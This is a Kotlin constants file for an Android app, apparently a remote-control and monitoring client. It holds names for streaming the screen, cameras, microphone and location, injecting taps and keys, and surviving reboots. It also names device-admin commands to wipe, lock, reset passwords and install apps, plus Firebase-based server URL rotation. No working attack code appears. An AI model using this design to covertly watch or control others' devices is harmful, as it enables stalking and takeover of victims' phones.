package com.akdevelopers.streamnode.core

/**
 * AppConstants — single source of truth for every app-wide constant.
 */
object AppConstants {

    // ── SharedPreferences file name ───────────────────────────────────────────
    const val PREFS_FILE = "streamnode"

    // ── SharedPreferences keys ────────────────────────────────────────────────
    const val PREF_STREAM_ID            = "stream_id"
    const val PREF_DISPLAY_NAME         = "display_name"
    const val PREF_SERVER_URL           = "server_url"
    const val PREF_AUTO_RESTART         = "auto_restart"
    /** Feature 8 — Auto-Start on Boot: user-visible toggle persisted to prefs. */
    const val PREF_AUTO_START_ON_BOOT   = "pref_auto_start_on_boot"

    /**
     * Persisted flag: true when the server has sent a "start" command and streaming
     * should be active. Cleared on "stop". Used to restore streaming after a service
     * restart / boot while the server's start command was already issued.
     */
    const val PREF_STREAM_ACTIVE        = "pref_stream_active"
    const val PREF_FIREBASE_LAST_TS     = "firebase_last_ts"
    const val PREF_LAST_COMMAND_ID      = "last_command_id"
    const val PREF_AUTOSTART_PROMPTED   = "autostart_prompted"
    const val PREF_AUTOSTART_CONFIRMED  = "autostart_confirmed"
    const val PREF_SERVICE_START_EPOCH  = "service_start_epoch"
    const val PREF_APP_CMD_LAST_TS      = "app_cmd_last_ts"
    const val PREF_DEVICE_ADMIN_ENABLED = "device_admin_enabled"
    const val PREF_DEVICE_OWNER_ENABLED = "device_owner_enabled"


    /**
     * Epoch ms of the last successful Firebase serverUrl_v2 fetch.
     * Used by ConnectionOrchestrator to schedule periodic URL refresh polls
     * while the server is unreachable.
     */
    const val PREF_LAST_URL_REFRESH_TS  = "pref_last_url_refresh_ts"

    // ── WebRTC feature flag ───────────────────────────────────────────────────
    const val PREF_WEBRTC_ENABLED       = "webrtc_enabled"
    const val WEBRTC_ENABLED_DEFAULT    = true

    // ── Phase 3: Transport mode user preference ───────────────────────────────
    /**
     * When true (default) transport is chosen automatically:
     * WebRTC is attempted first; WebSocket is the fallback.
     * When false the user has pinned a specific transport via PREF_WEBRTC_ENABLED.
     */
    const val PREF_TRANSPORT_AUTO       = "transport_auto"

    // ── WebRTC server paths ───────────────────────────────────────────────────
    const val WEBRTC_SIGNALING_PATH     = "/signal"
    const val WEBRTC_ICE_CONFIG_PATH    = "/ice-config"

    // ── Firebase ──────────────────────────────────────────────────────────────
    const val FIREBASE_DB_URL =
        "https://streamnode-df815-default-rtdb.asia-southeast1.firebasedatabase.app"

    const val FIREBASE_PATH_USERS         = "users"
    const val FIREBASE_PATH_CONTROL       = "control"
    const val FIREBASE_PATH_STATUS        = "status"
    const val FIREBASE_PATH_REALTIME      = "realtime"
    const val FIREBASE_PATH_STREAMS       = "streams"
    const val FIREBASE_PATH_STREAMNODE_CFG  = "streamnode_config"
    const val FIREBASE_PATH_SERVER_URL    = "serverUrl_v2"
    const val FIREBASE_PATH_ADMIN_STATUS  = "adminStatus"
    const val FIREBASE_PATH_ADMIN_LOG     = "adminLog"

    /**
     * Written by the server on every startup (epoch ms). Android devices listen to
     * this path and call reconnectNow() immediately when the value changes, bypassing
     * the Phase-2 backoff delay (up to 5 min) after a server restart.
     */
    const val FIREBASE_PATH_SERVER_STARTED_AT = "serverStartedAt"

    /**
     * Written by the server: true on startup, false on graceful SIGINT.
     * Used by the dashboard to show server health.
     */
    const val FIREBASE_PATH_SERVER_ONLINE     = "serverOnline"

    /**
     * Last known serverStartedAt epoch saved to SharedPreferences.
     * Suppresses the initial Firebase cache-hit when the listener first attaches,
     * so a stored value from the previous session does not trigger a spurious reconnect.
     */
    const val PREF_SERVER_STARTED_AT = "pref_server_started_at"

    const val FIREBASE_FETCH_TIMEOUT_MS   = 5_000L


    /**
     * How often the app re-polls Firebase for a fresh serverUrl_v2 while in a
     * disconnected / reconnecting state.  30 min is enough to react when the
     * operator redeploys with a new domain, without spamming Firebase.
     */
    const val FIREBASE_URL_REFRESH_INTERVAL_MS = 30L * 60 * 1_000  // 30 min

    // ── Networking defaults ───────────────────────────────────────────────────
    // Bug #9 fix: the old value was a hardcoded stale ngrok URL that always fails
    // on cold start when Firebase is unavailable. An empty string causes the app
    // to wait for Firebase rather than attempting a connection that will never succeed.
    // ConnectionOrchestrator treats "" as "no URL yet" and skips openSocket().
    const val DEFAULT_SERVER_URL = ""

    // ── WebSocket reconnect back-off ──────────────────────────────────────────
    /**
     * Two-phase exponential back-off for WebSocket reconnects.
     *
     * Phase 1 — attempts 1 … RECONNECT_BACKOFF_EXTEND_AFTER:
     *   Doubling cap = RECONNECT_BACKOFF_MAX_NORMAL_MS (30 s).
     *   Fast recovery for brief network blips or server restarts.
     *
     * Phase 2 — attempts > RECONNECT_BACKOFF_EXTEND_AFTER:
     *   Cap raised to RECONNECT_BACKOFF_MAX_EXTENDED_MS (5 min).
     *   Server may be down for days / months / years — conserve battery.
     *
     * NetworkChangeReceiver resets attempt counter to 0, so Phase 1 fires
     * immediately when real connectivity is restored.
     */
    const val RECONNECT_BACKOFF_MAX_NORMAL_MS   = 30_000L          // 30 s  (phase 1 cap)
    const val RECONNECT_BACKOFF_MAX_EXTENDED_MS = 5L * 60 * 1_000  // 5 min (phase 2 cap)
    const val RECONNECT_BACKOFF_EXTEND_AFTER    = 10               // switch to phase 2 after N attempts


    // ── Screen-share WebSocket paths ──────────────────────────────────────────
    const val SCREEN_WS_PATH   = "/screen"
    const val SCREEN_VIEW_PATH = "/screen-view"

    // ── Camera WebSocket paths ────────────────────────────────────────────────
    const val CAMERA_FRONT_WS_PATH   = "/camera-front"
    const val CAMERA_BACK_WS_PATH    = "/camera-back"
    const val CAMERA_FRONT_VIEW_PATH = "/camera-front-view"
    const val CAMERA_BACK_VIEW_PATH  = "/camera-back-view"

    // ── Camera prefs ──────────────────────────────────────────────────────────
    const val PREF_CAMERA_FRONT_ACTIVE = "camera_front_active"
    const val PREF_CAMERA_BACK_ACTIVE  = "camera_back_active"

    // ── Quality preset pref ───────────────────────────────────────────────────
    const val PREF_QUALITY_PRESET = "quality_preset"

    // ── Input injection command kinds ─────────────────────────────────────────
    const val INPUT_CMD_TYPE   = "input"
    const val INPUT_KIND_TAP   = "tap"
    const val INPUT_KIND_SWIPE = "swipe"
    const val INPUT_KIND_KEY   = "key"

    const val KEYCODE_HOME       = 3
    const val KEYCODE_BACK       = 4
    const val KEYCODE_APP_SWITCH = 187

    // ── Command dedup history ─────────────────────────────────────────────────
    const val COMMAND_DEDUP_MAX_HISTORY  = 50
    /** §5.4: Target size after an hourly background prune — keeps last N entries. */
    const val COMMAND_DEDUP_HOURLY_KEEP  = 20

    // ── Watchdog timing ───────────────────────────────────────────────────────
    const val WATCHDOG_ALARM_INTERVAL_MS    = 15L * 60 * 1_000
    const val WATCHDOG_COLD_START_GRACE_MS  = 30_000L
    const val WATCHDOG_ALARM_REQUEST_CODE   = 0xAC1

    // ── Network reconnect cooldown ────────────────────────────────────────────
    const val NETWORK_RECONNECT_COOLDOWN_MS = 3_000L

    // ── Metrics ───────────────────────────────────────────────────────────────
    const val METRICS_INTERVAL_MS = 60_000L

    // ── Phase 2: Adaptive telemetry intervals ─────────────────────────────────
    /** Normal interval when the screen is ON and streaming is active. */
    const val TELEMETRY_INTERVAL_SCREEN_ON_MS      = 60_000L   // 60 s
    /** Stretched interval when the screen is OFF but streaming is active. */
    const val TELEMETRY_INTERVAL_SCREEN_OFF_MS     = 120_000L  // 2 min
    /** Stretched interval when screen is OFF AND mic is not active (idle). */
    const val TELEMETRY_INTERVAL_IDLE_MS           = 300_000L  // 5 min
    /** Full-resync interval for delta telemetry (ensures dashboard stays in sync). */
    const val TELEMETRY_FULL_RESYNC_INTERVAL_MS    = 5L * 60 * 1_000   // 5 min

    // ── Device Admin command action strings ───────────────────────────────────
    const val ADMIN_CMD_LOCK            = "admin_lock"
    const val ADMIN_CMD_WIPE            = "admin_wipe"
    const val ADMIN_CMD_REBOOT          = "admin_reboot"
    const val ADMIN_CMD_CAMERA_DISABLE  = "admin_camera_disable"
    const val ADMIN_CMD_RESET_PASSWORD  = "admin_reset_password"
    const val ADMIN_CMD_SET_BRIGHTNESS  = "admin_brightness"
    const val ADMIN_CMD_SET_VOLUME      = "admin_volume"
    const val ADMIN_CMD_CLEAR_APP_DATA  = "admin_clear_app_data"
    const val ADMIN_CMD_INSTALL_APP     = "admin_install_app"
    const val ADMIN_CMD_UNINSTALL_APP   = "admin_uninstall_app"
    const val ADMIN_CMD_MAX_FAILS       = "admin_max_fails"
    const val ADMIN_CMD_MAX_LOCK_TIME   = "admin_max_lock_time"
    const val ADMIN_CMD_TORCH           = "admin_torch"

    // ── Location streaming ────────────────────────────────────────────────────
    const val PREF_SEND_LOCATION = "pref_send_location"

    // ── Phase 6 Step 29: Adaptive Bitrate ─────────────────────────────────────
    /**
     * When true (default) MicOrchestrator.autoQualityFromRtt() automatically adjusts
     * the Opus quality preset based on measured control-socket round-trip time:
     *   RTT < 150 ms  → HIGH_QUALITY (192 kbps)
     *   RTT 150–400 ms → MEDIUM      (96 kbps)
     *   RTT > 400 ms  → LOW          (32 kbps)
     * Step-downs are immediate; step-ups use a 30 s hysteresis to prevent oscillation.
     */
    const val PREF_ADAPTIVE_BITRATE = "pref_adaptive_bitrate"
}
